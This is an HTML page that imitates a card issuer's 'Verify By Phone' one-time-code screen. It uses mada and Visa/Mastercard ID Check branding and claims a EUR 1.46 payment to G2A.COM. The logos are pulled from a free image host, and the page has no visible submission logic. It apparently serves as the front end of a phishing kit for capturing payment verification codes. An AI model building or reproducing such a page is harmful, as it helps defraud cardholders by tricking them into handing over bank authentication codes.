<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .back-btn {
            color: #0000FF;
            font-size: 28px;
            font-weight: bold;
            text-decoration: none;
        }

        .cancel-btn {
            font-weight: bold;
            font-size: 16px;
        }

        /* تنسيق الشعارات - التعديل هنا */
        .header-logos {
            display: flex;
            justify-content: space-between;
            align-items: center; /* لجعلهما على خط واحد */
            margin-bottom: 10px;
        }

        .mada-logo img {
            height: 60px; /* نفس مقاس مدى */
            width: auto;
            display: block;
        }

        .visa-master-logo img {
            height: 60px; /* تم تكبيره ليتساوى مع شعار مدى تماماً */
            width: auto;
            display: block;
        }

        .id-check-label {
            text-align: right;
            font-size: 12px;
            color: #444;
            font-weight: 500;
            margin-top: 2px;
        }

        hr {
            border: 0;
            border-top: 1.5px solid #f0f0f0;
            margin: 15px 0 30px 0;
        }

        h1 {
            font-family: "Times New Roman", Times, serif;
            font-size: 26px;
            margin: 0 0 25px 0;
        }

        p {
            font-size: 17px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .form-section {
            text-align: center;
            margin-top: 50px;
        }

        .input-hint {
            display: block;
            font-size: 15px;
            color: #888;
            margin-bottom: 15px;
        }

        input[type="text"] {
            width: 100%;
            max-width: 350px;
            height: 55px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 24px;
            text-align: center;
            margin-bottom: 30px;
        }

        .confirm-button {
            width: 100%;
            background-color: #0000FF;
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            text-transform: uppercase;
        }

        .resend-text {
            display: block;
            margin-top: 40px;
            color: #0000FF;
            text-decoration: none;
            font-weight: bold;
            font-size: 16px;
            margin-bottom: 60px;
        }

        .footer-nav {
            border-top: 1px solid #eee;
        }

        .footer-link {
            display: flex;
            justify-content: space-between;
            padding: 18px 0;
            color: #00008B;
            text-decoration: none;
            font-size: 16px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="top-bar">
        <a href="#" class="back-btn">&#10094;</a>
        <div class="cancel-btn">Cancel</div>
    </div>

    <div class="header-logos">
        <div class="mada-logo">
            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
        </div>
        <div class="visa-master-logo">
            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Visa Mastercard">
            <div class="id-check-label">ID Check</div>
        </div>
    </div>

    <hr>

    <h1>Verify By Phone</h1>

    <p>We have sent you a text message with a code to your registered mobile number.</p>
    
    <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>

    <div class="form-section">
        <label class="input-hint">Verification code</label>
        <input type="text">
        <button class="confirm-button">Confirm</button>
        <a href="#" class="resend-text">RESEND CODE</a>
    </div>

    <div class="footer-nav">
        <a href="#" class="footer-link">Learn more about authentication <span>+</span></a>
        <a href="#" class="footer-link">Need some help ? <span>+</span></a>
    </div>
</div>

</body>
</html>
